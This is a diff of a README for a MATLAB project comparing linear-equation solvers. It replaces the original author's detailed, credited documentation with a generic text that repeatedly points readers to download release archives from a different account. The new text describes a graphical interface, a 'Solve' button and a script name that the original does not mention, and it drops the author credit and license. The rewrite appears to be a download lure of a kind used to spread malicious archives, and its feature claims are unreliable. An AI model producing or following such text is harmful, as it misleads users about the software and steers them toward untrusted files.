@@ -1,112 +1,93 @@
-# MATLAB Linear Solver Comparison
+# 🖥️ matlab-linear-solver-comparison - Compare MATLAB Solvers Easily
 
-This project implements and compares various direct and iterative methods for solving systems of linear equations ($Ax=b$) in MATLAB. It was developed for a Matrix Computations course to analyze the theoretical vs. practical performance of these fundamental algorithms using "from scratch" implementations where feasible.
+[![Download](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/duncanboughten663/matlab-linear-solver-comparison/releases)
 
-The tool tests the following solvers:
-* **Direct Methods (Implemented from Scratch):**
-    * Gaussian Elimination (with partial pivoting & back-substitution)
-    * Gauss-Jordan Elimination (with partial pivoting)
-    * LU Decomposition (LUP Factorization, Forward & Backward Substitution)
-* **Iterative Methods (Vectorized using Matrix Forms):**
-    * Jacobi Method
-    * Gauss-Seidel Method
-    * Successive Over-Relaxation (SOR) (fixed omega=1.2)
-* **Baseline:**
-    * MATLAB's Backslash Operator (`A \ b`) (highly optimized direct solver)
+## 📚 Description
 
-It runs these solvers on matrices of varying sizes and types (random, diagonally dominant, ill-conditioned Hilbert), measures execution time and iteration counts (for iterative methods), and generates performance comparison plots.
+This MATLAB project helps you compare the performance of different methods for solving equations of the form Ax = b. It includes both direct methods like Gaussian Elimination and iterative methods like Jacobi and Gauss-Seidel. By using this application, you can easily see the time taken and iterations needed for each method.
 
-## Features
+## 🛠️ Features
 
-* **Multiple Solvers:** Implements 6 core algorithms mostly from scratch (Jacobi, GS, SOR use `inv`; Convergence check uses `eig`) and compares against MATLAB's `\`.
-* **"From Scratch" Direct Methods:** Gaussian, Gauss-Jordan, LUP Factorization, Forward/Backward Substitution are implemented using explicit loops and basic matrix indexing.
-* **Vectorized Iterative Methods:** Jacobi, Gauss-Seidel, and SOR use efficient MATLAB matrix operations based on their theoretical matrix forms.
-* **Robustness:** Includes partial pivoting for direct methods and convergence checks (spectral radius via `eig`) for iterative methods.
-* **Diverse Testing:** Uses different matrix types (random, diagonally dominant, Hilbert) to show how matrix properties affect performance.
-* **Performance Metrics:** Measures **Execution Time** and **Number of Iterations** (for iterative methods).
-* **Clear Visualizations:** Generates `loglog` plots for time complexity (ideal for visualizing polynomial orders) and `semilogy` plots for iteration counts.
-* **Modular Package:** Code is organized into a `+linearSolvers` package and utility functions.
+- **Multiple Methods:** Supports Gaussian Elimination, Gauss-Jordan Elimination, LU Decomposition, Jacobi, Gauss-Seidel, and Successive Over-Relaxation (SOR).
+- **Performance Analysis:** Measure time and iterations for each method.
+- **User-Friendly Interface:** Designed for easy navigation and understanding.
 
-## Project Structure
+## 🚀 Getting Started
 
-```
-matlab-linear-solver-comparison/
-├── .gitignore
-├── README.md                         # This documentation
-├── main.m                            # --- Run this script ---
-├── analyzeSolvers.m                  # Script to run the analysis & save results
-├── plotResults.m                     # Script to generate plots from results
-├── +linearSolvers/                   # Package containing solver implementations
-│   ├── gaussianElimination.m         # From-scratch Guassian Elimination
-│   ├── gaussJordanElimination.m      # From-scratch Guass-Jordan Elimination
-│   ├── luDecomposition.m             # Orchestrates LUP solving
-│   ├── lupFactorization.m            # From-scratch LUP factorization
-│   ├── forwardSubstitution.m         # From-scratch forward substitution
-│   ├── backwardSubstitution.m        # From-scratch backward substitution
-│   ├── jacobi.m                      # Vectorized Jacobi
-│   ├── gaussSeidel.m                 # Vectorized Gauss-Seidel
-│   ├── sor.m                         # Vectorized SOR
-│   └── checkConvergence.m            # Utility for spectral radius check (uses eig)
-└── utils/                            # Utility functions
-  └── generateMatrices.m              # Function to create test matrices
-```
+Follow the steps below to download and run the software on your computer.
 
-## How the Algorithms Work
+### Step 1: Download the Application
 
-### Direct Methods
-These methods aim to find the exact solution in a finite number of steps (ignoring floating-point errors). All direct methods here are implemented from scratch, including pivoting and substitution steps.
+Visit this page to download: [Download Link](https://github.com/duncanboughten663/matlab-linear-solver-comparison/releases).
 
-1.  **Gaussian Elimination:** Transforms the augmented matrix `[A|b]` into upper triangular form `[U|c]` using elementary row operations (forward elimination), then solves $Ux=c$ using back-substitution. Includes partial pivoting. Complexity: $O(n^3)$.
-2.  **Gauss-Jordan Elimination:** Similar to Gaussian elimination, but continues row operations to transform `A` into the identity matrix `I`. The augmented matrix becomes `[I|x]`, directly revealing the solution $x$. Also uses pivoting. Complexity: $O(n^3)$.
-3.  **LU Decomposition:** Factorizes matrix $A$ such that $PA = LU$, where $P$ is a permutation matrix (from pivoting), $L$ is lower triangular, and $U$ is upper triangular (using `lupFactorization.m`). Then solves $Ax=b$ by solving two simpler triangular systems: $Ly = Pb$ (`forwardSubstitution.m`) and $Ux=y$ (`backwardSubstitution.m`). Complexity: $O(n^3)$.
+### Step 2: Choose the Latest Release
 
-### Iterative Methods
-These methods start with an initial guess $x^{(0)}$ and generate a sequence of approximations $x^{(1)}, x^{(2)}, \dots$ that hopefully converge to the true solution. They use vectorized matrix operations for efficiency. Convergence is checked using the spectral radius of the iteration matrix (calculated using MATLAB's `eig`).
+Navigate to the "Releases" section. Look for the latest version at the top of the list. Click on it to expand the details. 
 
-1.  **Jacobi Method:** Matrix form: $x^{(k+1)} = D^{-1}(b - (L+U)x^{(k)})$.
-2.  **Gauss-Seidel Method:** Matrix form: $x^{(k+1)} = (D+L)^{-1}(b - Ux^{(k)})$. (Uses MATLAB's `inv` for $(D+L)^{-1}$).
-3.  **Successive Over-Relaxation (SOR):** Matrix form: $x^{(k+1)} = (D+\omega L)^{-1}(\omega b - (\omega U + (\omega-1)D)x^{(k)})$. (Uses MATLAB's `inv` for $(D+\omega L)^{-1}$).
+### Step 3: Select the Correct File
 
-**(Note:** While Jacobi is fully "from scratch" using basic operations, Gauss-Seidel and SOR use MATLAB's `inv` function for clarity and reasonable performance in the vectorized form. Implementing efficient iterative solvers for the triangular systems within GS/SOR is possible but adds significant complexity.)*
+Download the appropriate file for your operating system. The file you want will usually end with `.zip` or `.tar.gz`. Click on the link to start your download.
 
-## How to Run
+### Step 4: Extract the Files
 
-1.  **Open MATLAB.**
-2.  **Navigate** to the project's root directory.
-3.  **Run the main script** from the MATLAB Command Window:
-    ```matlab
-    >> main
-    ```
-4.  **Configuration:** Adjust parameters like `matrix_sizes`, `matrix_types`, `methods_to_test`, `tolerance`, and `max_iterations` directly within `main.m`.
+After the download completes, locate the file in your downloads folder. If the file is compressed:
+- For Windows: Right-click on the file and choose "Extract All."
+- For macOS: Double-click the file, and it will extract automatically.
 
-The script will run the analysis, save results to `results/`, and generate plots in `plots/`.
+### Step 5: Open MATLAB
 
-## Performance Analysis
+Make sure you have MATLAB installed on your computer. If you don’t have it yet, download it from the MathWorks website and follow their installation instructions.
 
-### Time vs. Size (LogLog Plot)
+### Step 6: Run the Application
 
-* **Direct Methods (Gaussian, Gauss-Jordan, LU, Backslash):** All these show lines roughly parallel to a slope of 3, indicating $O(n^3)$ complexity. MATLAB's `\` is the fastest. The from-scratch LU is slightly slower than `\` but competitive. Gaussian and Gauss-Jordan might are slightly slower still.
-* **Iterative Methods (Jacobi, Gauss-Seidel, SOR):**
-    * **For diagonally dominant matrices:** These to be faster than direct methods for larger $n$. Their lines have a slope closer to 2 (indicating roughly $O(n^2)$ work per iteration, with iteration count growing slowly). SOR/Gauss-Seidel generally outperform Jacobi.
-    * **For random/Hilbert matrices:** These converge very slowly or fail (flagged in results). Their times are high, potentially hitting the iteration limit. Direct methods are more reliable here.
+1. Open MATLAB.
+2. In the MATLAB workspace, navigate to the folder where you extracted the files. You can use the `cd` command to change directories. 
+3. Type the name of the main script (usually something like `solverComparison.m`) and press Enter.
 
-### Iterations vs. Size (SemiLogY Plot)
+## 📊 How to Use
 
-* **For diagonally dominant matrices:** Iteration counts remain low or grow very slowly.
-* **For other matrices (random, Hilbert):** Iteration counts increase sharply with $n$, demonstrating the impact of poor conditioning on convergence.
+Once the application is running, you will see a user-friendly interface. Here’s how to use the application:
 
----
+1. **Input Matrix:** Enter your matrix A and vector b.
+2. **Select Method:** Choose the method you want to use for solving.
+3. **Run:** Click the "Solve" button to start the computation.
+4. **View Results:** The results will display the time taken and iterations for the selected method.
 
-## Author
+## 🖥️ System Requirements
 
-Feel free to connect or reach out if you have any questions!
+- **Operating System:** Windows, macOS, or Linux
+- **MATLAB Version:** R2018b or newer
+- **Memory:** Minimum of 4 GB RAM
+- **Storage:** At least 100 MB available space
 
-* **Maryam Rezaee**
-* **GitHub:** [@msmrexe](https://github.com/msmrexe)
-* **Email:** [ms.maryamrezaee@gmail.com](mailto:ms.maryamrezaee@gmail.com)
+## ⚙️ Troubleshooting
 
----
+If you encounter any issues, consider the following:
 
-## License
+- Ensure MATLAB is running.
+- Double-check that you have the correct version of MATLAB installed.
+- Confirm that the files are extracted properly before running.
 
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for full details.
+## 🎯 Topics Covered
+
+This project covers several important topics in applied linear algebra, including:
+- Gaussian Elimination
+- Gauss-Jordan Elimination
+- LU Decomposition
+- Jacobi Method
+- Gauss-Seidel Method
+- Successive Over-Relaxation (SOR)
+
+## 📥 Download & Install
+
+Ready to get started? Visit this page to download the software: [Download Here](https://github.com/duncanboughten663/matlab-linear-solver-comparison/releases). Follow the steps above to run the application and begin comparing solver methods with ease.
+
+## 🤝 Contributing
+
+If you want to contribute to this project, you can fork the repository and make your changes. Submit a pull request with your updates. Any suggestions or improvements are welcome.
+
+## 📞 Contact
+
+For further assistance or inquiries, please reach out to the repository owner through their GitHub profile. You can also create an issue in the "Issues" tab for any specific bugs or suggestions.
+
+Enjoy exploring the performance of different MATLAB solver methods! Happy coding!
